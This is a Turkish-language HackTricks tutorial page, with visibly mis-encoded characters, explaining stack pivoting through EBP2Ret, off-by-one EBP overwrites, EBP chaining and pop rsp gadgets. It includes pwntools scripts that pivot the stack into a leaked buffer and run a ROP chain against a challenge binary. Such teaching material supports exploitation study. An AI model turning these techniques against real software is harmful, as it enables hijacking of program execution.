# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipÃ¼le etme yeteneÄŸinden yararlanarak, EBP kaydÄ±nÄ±n dikkatli kullanÄ±mÄ± ve `leave; ret` talimat dizisi aracÄ±lÄ±ÄŸÄ±yla birden fazla iÅŸlevin yÃ¼rÃ¼tÃ¼lmesini zincirleme imkanÄ± saÄŸlar.

HatÄ±rlatmak gerekirse, **`leave`** temelde ÅŸunu ifade eder:
```
mov               esp, ebp
pop               ebp
ret
```
And as the **EBP stack'te** EIP'den Ã¶nce olduÄŸu iÃ§in, yÄ±ÄŸÄ±nÄ± kontrol ederek bunu kontrol etmek mÃ¼mkÃ¼ndÃ¼r.

### EBP2Ret

Bu teknik, **EBP kaydÄ±nÄ± deÄŸiÅŸtirebilirken EIP kaydÄ±nÄ± doÄŸrudan deÄŸiÅŸtirme yolunuz yoksa** Ã¶zellikle faydalÄ±dÄ±r. FonksiyonlarÄ±n Ã§alÄ±ÅŸmayÄ± bitirdiÄŸinde gÃ¶sterdiÄŸi davranÄ±ÅŸÄ± kullanÄ±r.

EÄŸer `fvuln`'Ä±n Ã§alÄ±ÅŸmasÄ± sÄ±rasÄ±nda, yÄ±ÄŸÄ±nda **sahte bir EBP** enjekte etmeyi baÅŸarÄ±rsanÄ±z ve bu EBP, shellcode'unuzun adresinin bulunduÄŸu bir bellek alanÄ±na iÅŸaret ediyorsa (artÄ± `pop` iÅŸlemi iÃ§in 4 byte ekleyerek), EIP'yi dolaylÄ± olarak kontrol edebilirsiniz. `fvuln` dÃ¶ndÃ¼ÄŸÃ¼nde, ESP bu hazÄ±rlanmÄ±ÅŸ konuma ayarlanÄ±r ve sonraki `pop` iÅŸlemi ESP'yi 4 azaltÄ±r, **etkili bir ÅŸekilde orada saldÄ±rgan tarafÄ±ndan saklanan bir adrese iÅŸaret eder.**\
**2 adresi bilmeniz gerektiÄŸini unutmayÄ±n**: ESP'nin gideceÄŸi adres ve ESP'nin iÅŸaret ettiÄŸi adresi yazmanÄ±z gereken yer.

#### Exploit YapÄ±sÄ±

Ã–ncelikle, **rastgele veri/adres yazabileceÄŸiniz bir adresi bilmeniz gerekir**. ESP buraya iÅŸaret edecek ve **ilk `ret`'i Ã§alÄ±ÅŸtÄ±racak**.

Sonra, **rastgele kodu Ã§alÄ±ÅŸtÄ±racak** `ret` tarafÄ±ndan kullanÄ±lan adresi bilmeniz gerekir. ÅunlarÄ± kullanabilirsiniz:

* GeÃ§erli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresi.
* **`system()`** adresi, ardÄ±ndan **4 Ã§Ã¶p byte** ve `"/bin/sh"` adresi (x86 bit).
* **`jump esp;`** gadget'Ä±nÄ±n adresi ([**ret2esp**](ret2esp-ret2reg.md)) ardÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lacak **shellcode**.
* BazÄ± [**ROP**](rop-return-oriented-programing.md) zinciri.

KontrollÃ¼ bellek kÄ±smÄ±ndaki bu adreslerin Ã¶nÃ¼nde **`4` byte** bulunmasÄ± gerektiÄŸini unutmayÄ±n, Ã§Ã¼nkÃ¼ **`pop`** kÄ±smÄ± `leave` talimatÄ±nÄ±n gereÄŸidir. Bu 4B'yi, **ikinci sahte EBP** ayarlamak ve yÃ¼rÃ¼tmeyi kontrol etmeye devam etmek iÃ§in kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼ndÃ¼r.

#### Off-By-One Exploit

Bu tekniÄŸin "Off-By-One Exploit" olarak bilinen Ã¶zel bir varyantÄ± vardÄ±r. **EBP'nin en az anlamlÄ± byte'Ä±nÄ± yalnÄ±zca deÄŸiÅŸtirebildiÄŸinizde** kullanÄ±lÄ±r. BÃ¶yle bir durumda, **`ret`** ile atlanacak adresi saklayan bellek konumu, EBP ile ilk Ã¼Ã§ byte'Ä± paylaÅŸmalÄ±dÄ±r, bu da daha kÄ±sÄ±tlÄ± koÅŸullarla benzer bir manipÃ¼lasyona izin verir.

### **EBP Zincirleme**

Bu nedenle, yÄ±ÄŸÄ±nda kontrol edilen bir adresi `EBP` giriÅŸine ve `EIP`'de `leave; ret` adresini koyarak, **`ESP`'yi yÄ±ÄŸÄ±n Ã¼zerinden kontrol edilen `EBP` adresine taÅŸÄ±mak mÃ¼mkÃ¼ndÃ¼r.**

ArtÄ±k, **`ESP`** istenen bir adrese iÅŸaret ediyor ve yÃ¼rÃ¼tÃ¼lecek bir sonraki talimat bir `RET`. Bunu kÃ¶tÃ¼ye kullanmak iÃ§in, kontrol edilen ESP konumuna ÅŸunlarÄ± yerleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r:

* **`&(next fake EBP)`** -> `leave` talimatÄ±ndan `pop ebp` nedeniyle yeni EBP'yi yÃ¼kle
* **`system()`** -> `ret` tarafÄ±ndan Ã§aÄŸrÄ±lÄ±r
* **`&(leave;ret)`** -> sistem sona erdikten sonra Ã§aÄŸrÄ±lÄ±r, ESP'yi sahte EBP'ye taÅŸÄ±r ve tekrar baÅŸlar
* **`&("/bin/sh")`**-> `system` iÃ§in parametre

Temelde bu ÅŸekilde, programÄ±n akÄ±ÅŸÄ±nÄ± kontrol etmek iÃ§in birkaÃ§ sahte EBP'yi zincirlemek mÃ¼mkÃ¼ndÃ¼r.

Bu, bir [ret2lib](ret2lib/) gibidir, ancak gÃ¶rÃ¼nÃ¼r bir faydasÄ± olmadan daha karmaÅŸÄ±ktÄ±r, ancak bazÄ± kenar durumlarÄ±nda ilginÃ§ olabilir.

AyrÄ±ca, bu tekniÄŸi bir **stack leak** ile kazanan bir fonksiyonu Ã§aÄŸÄ±rmak iÃ§in kullanan bir [**challenge Ã¶rneÄŸi**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) var. Bu, sayfanÄ±n son yÃ¼klemesidir:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP iÅŸe yaramaz

[**bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), eÄŸer bir ikili dosya bazÄ± optimizasyonlarla derlenmiÅŸse, **EBP asla ESP'yi kontrol etmez**, bu nedenle EBP'yi kontrol ederek Ã§alÄ±ÅŸan herhangi bir exploit temelde baÅŸarÄ±sÄ±z olur Ã§Ã¼nkÃ¼ gerÃ§ek bir etkisi yoktur.\
Bu, **prolog ve epilog deÄŸiÅŸtiÄŸi** iÃ§in, eÄŸer ikili dosya optimize edilmiÅŸse.

* **Optimize edilmemiÅŸ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimize edilmiÅŸ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP'yi Kontrol Etmenin DiÄŸer YollarÄ±

### **`pop rsp`** gadget

[**Bu sayfada**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) bu tekniÄŸi kullanan bir Ã¶rnek bulabilirsiniz. Bu zorluk iÃ§in 2 belirli argÃ¼manla bir fonksiyon Ã§aÄŸrÄ±lmasÄ± gerekiyordu ve bir **`pop rsp` gadget** vardÄ± ve **stack'ten bir leak** vardÄ±:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
## Referanslar

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
